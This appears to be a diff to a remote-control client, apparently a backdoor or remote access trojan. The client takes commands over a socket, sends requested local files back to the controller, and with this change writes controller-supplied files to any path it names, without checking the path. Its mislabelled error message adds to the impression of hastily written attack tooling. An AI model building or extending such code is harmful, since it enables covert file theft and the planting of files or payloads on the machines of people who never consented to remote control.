@@ -72,7 +72,20 @@ def upload(sock, path):
             send(sock, f"ERROR: Could not read file. {str(e)}".encode())
     else:
         send(sock, "ERROR: File or folder not found.".encode())
-    
+
+def download(sock, path):
+    save_dir = os.getcwd()
+    full_save_path = os.path.normpath(os.path.join(save_dir, path))
+    if not save_dir or not path:
+        return
+    try:
+        data = recv(sock)
+        with open(full_save_path, 'wb') as f:
+            f.write(data)
+        send(sock, f"File saved in {save_dir}".encode())
+    except Exception as e:
+        send(sock, "ERROR: Failed to upload the file".encode())
+
 def kill_connection(sock):
         sock.close()
         sys.exit()
@@ -125,6 +138,10 @@ def handle_cmd(sock):
                 elif cmd.startswith("download "):
                     path = cmd[len("download "):].strip()
                     upload(sock, path)
+
+                elif cmd.startswith("upload "):
+                    path = cmd[len("upload "):].strip()
+                    download(sock, path)
                     
                 elif cmd.lower() == "kill":
                     kill_connection(sock)
